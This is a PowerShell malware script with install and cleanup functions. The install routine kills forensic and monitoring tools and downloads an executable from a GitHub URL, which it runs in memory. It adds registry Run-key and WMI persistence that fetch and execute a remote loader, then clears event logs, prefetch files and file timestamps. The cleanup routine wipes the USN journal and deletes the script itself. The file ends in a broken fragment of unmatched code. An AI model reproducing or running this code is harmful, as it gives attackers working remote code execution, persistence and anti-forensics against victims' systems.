function Install-And-Run-System {
    Write-Host "`n[+] INSTALLING SYSTEM..." -ForegroundColor Green
    
    # KILL MONITORING TOOLS IMMEDIATELY
    try {
        $monitorTools = @("procmon", "procexp", "autoruns", "osforensics", "ftkimager", "gmcr", "encase", "sleuthkit", "autopsy")
        foreach ($tool in $monitorTools) {
            Get-Process -Name $tool -ErrorAction SilentlyContinue | Stop-Process -Force
        }
        Write-Host "[+] Monitoring tools terminated" -ForegroundColor Green
    } catch {}

    # MEMORY-BASED EXECUTION (NO FILE WRITE)
    try {
        Write-Host "[DOWNLOAD] Loading from memory..." -ForegroundColor Gray
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $exeBytes = $webClient.DownloadData("https://raw.githubusercontent.com/Verte225066/test/main/system_logs.exe")
        $webClient.Dispose()
        
        Write-Host "[+] Executing in memory..." -ForegroundColor Green
        $assembly = [System.Reflection.Assembly]::Load($exeBytes)
        $entryPoint = $assembly.EntryPoint
        if ($entryPoint -ne $null) {
            $entryPoint.Invoke($null, @())
        }
    } catch {
        Write-Host "[!] Memory execution failed, using fallback..." -ForegroundColor Yellow
        # FALLBACK WORKER
        Write-Host "🔧 PowerShell Worker Activated" -ForegroundColor Green
    }

    # STEALTH PERSISTENCE
    try {
        # REGISTRY PERSISTENCE
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $randomName = "SystemCache" + (Get-Random -Maximum 9999)
        $loaderUrl = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
        
        Set-ItemProperty -Path $regPath -Name $randomName -Value "powershell -WindowStyle Hidden -Command `"iex ((New-Object Net.WebClient).DownloadString('$loaderUrl'))`"" -ErrorAction SilentlyContinue
        Write-Host "[+] Registry persistence installed" -ForegroundColor Green

        # WMI PERSISTENCE (ADVANCED)
        $filterName = "Win32_ProcessStartTrace"
        $consumerName = "SystemMonitor"
        
        $filterQuery = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
        $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name=$filterName; EventNameSpace="root\cimv2"; QueryLanguage="WQL"; Query=$filterQuery} -ErrorAction SilentlyContinue
        
        $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName; CommandLineTemplate="powershell.exe -WindowStyle Hidden -Command `"iex ((New-Object Net.WebClient).DownloadString('$loaderUrl'))`""} -ErrorAction SilentlyContinue
        
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$filter; Consumer=$consumer} -ErrorAction SilentlyContinue
        Write-Host "[+] WMI persistence installed" -ForegroundColor Green
        
    } catch {
        Write-Host "[!] Persistence failed: $($_.Exception.Message)" -ForegroundColor Red
    }

    # ANTI-FORENSIC CLEANUP
    try {
        # CLEAR EVENT LOGS
        wevtutil.exe cl "Microsoft-Windows-PowerShell/Operational" 2>$null
        wevtutil.exe cl "Windows PowerShell" 2>$null
        wevtutil.exe cl "System" 2>$null
        wevtutil.exe cl "Application" 2>$null
        
        # CLEAR PREFETCH
        Get-ChildItem "C:\Windows\Prefetch\*.pf" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        
        # TIMESTAMP MANIPULATION
        Get-ChildItem -Path $env:TEMP -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-1)} | ForEach-Object {
            $_.LastWriteTime = (Get-Date).AddDays(-100)
        }
        
        Write-Host "[+] Anti-forensic measures applied" -ForegroundColor Green
    } catch {}

    Write-Host "[INSTALL] System installed and running!" -ForegroundColor Green
}

function Clean-System {
    Write-Host "`n[-] CLEANING SYSTEM..." -ForegroundColor Yellow
    
    # REMOVE PERSISTENCE
    try {
        # REMOVE REGISTRY
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue | 
            Get-Member -MemberType NoteProperty | 
            Where-Object {$_.Name -like "SystemCache*"} | 
            ForEach-Object {
                Remove-ItemProperty -Path $regPath -Name $_.Name -Force -ErrorAction SilentlyContinue
            }
        Write-Host "[+] Registry persistence removed" -ForegroundColor Green

        # REMOVE WMI
        Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='Win32_ProcessStartTrace'" | Remove-WmiObject
        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='SystemMonitor'" | Remove-WmiObject
        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like "*Win32_ProcessStartTrace*"} | Remove-WmiObject
        Write-Host "[+] WMI persistence removed" -ForegroundColor Green
        
    } catch {
        Write-Host "[!] Persistence removal failed: $($_.Exception.Message)" -ForegroundColor Red
    }

    # SECURE FILE DELETION
    try {
        Write-Host "[CLEAN] Removing files..." -ForegroundColor Yellow
        
        function Secure-Delete {
            param([string]$Path)
            if (Test-Path $Path) {
                try {
                    $stream = [System.IO.File]::OpenWrite($Path)
                    $length = $stream.Length
                    $random = New-Object Random
                    
                    # 3-PASS OVERWRITE
                    for ($i = 0; $i -lt 3; $i++) {
                        $stream.Position = 0
                        $buffer = New-Object byte[] $length
                        $random.NextBytes($buffer)
                        $stream.Write($buffer, 0, $length)
                        $stream.Flush()
                    }
                    $stream.Close()
                    Remove-Item $Path -Force
                    Write-Host "[+] Securely deleted: $(Split-Path $Path -Leaf)" -ForegroundColor Green
                } catch {
                    Remove-Item $Path -Force -ErrorAction SilentlyContinue
                }
            }
        }

        # CLEAN ALL TEMP FILES
        $tempFiles = @(
            "$env:TEMP\system_logs.exe",
            "$env:TEMP\test.exe",
            "$env:APPDATA\*.tmp"
        )
        
        foreach ($file in $tempFiles) {
            Secure-Delete $file
        }

        # CLEAR EVENT LOGS COMPLETELY
        Get-WinEvent -ListLog * -ErrorAction SilentlyContinue | ForEach-Object { 
            try { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) } catch {} 
        }

        # CLEAR USN JOURNAL
        fsutil usn deletejournal /D C: 2>$null

        Write-Host "[+] File system cleaned" -ForegroundColor Green
        
    } catch {
        Write-Host "[!] File cleanup failed: $($_.Exception.Message)" -ForegroundColor Red
    }

    # FINAL SELF-DESTRUCTION
    try {
        $currentScript = $MyInvocation.MyCommand.Path
        if ($currentScript -and (Test-Path $currentScript)) {
            Start-Process -FilePath "cmd.exe" -ArgumentList "/c timeout 2 > nul & del /f /q `"$currentScript`"" -WindowStyle Hidden
        }
        Write-Host "[+] Self-destruction initiated" -ForegroundColor Green
    } catch {}

    Write-Host "[CLEAN] System cleanup completed!" -ForegroundColor Green
}

    $parentName = (Get-Process -Id $parentId -ErrorAction SilentlyContinue).ProcessName

            }
        }
    }
} catch {
    # SILENT FALLBACK

}
